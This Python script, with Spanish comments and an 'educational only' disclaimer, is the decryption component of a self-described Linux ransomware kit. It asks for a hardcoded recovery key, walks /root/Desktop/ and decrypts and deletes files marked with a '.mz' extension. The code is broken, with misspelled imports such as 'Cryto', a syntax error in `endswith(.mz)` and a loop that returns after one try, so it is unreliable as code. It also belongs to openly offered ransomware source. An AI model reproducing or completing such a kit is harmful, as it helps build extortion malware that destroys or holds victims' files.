# 	NO ME HAGO CARGO DEL MAL USO, SOLO FINES EDUCATIVOS.
#	Ransomware en Python3 para Linux
#	Para mas informacion lea el README
# 	Descifrado Basico
#	--> AUTOR: Manza <--
#	--> VERSION: 1.0 <--

import os, sys, subprocess, request, random, datetime, string

from simplecrypt import encrypt, decrypt
from Cryto.Cipher import AES
from Cryto.PublicKey import RSA

key = "Prueba" #Llave de recuperacion

path_linux = "/root/Desktop/"

def descifrado(key, archivo, salida_archivo=None, chucksize=64*1024):

	salida_archivo = archivo.split('.')[0] + '.' + archivo.split('.')[1]
	filesize = os.path.getsize(archivo)

	with open(archivo, 'rb') as infile:
		with open(salida_archivo, 'wb') as outfile:
			descifrado = decrypt(key, infile.read())
			outfile.write(descifrado)
			outfile.close()

def archivos_infectados():
	archivos_infectados = []

	for root, dirs, files in os.walk(path_linux):
		for file in files:
			if file.endswith(.mz):
				descifrado(key, os.path.join(root, file))
				os.remove(os.path.join(root, file))

def ingreso_pass(key):
	ingreso = input('Ingrese la clave de desencriptacion: ')
	while True:
		if ingreso == key:
			print("")
			print("[+] Desencriptando archivos...")
			print("")
			archivos_infectados()
			print("")
			print("[+] Desencriptacion completada...")
			return False
		else:
			print("La clave no es correcta")
			return False

ingreso_pass(key)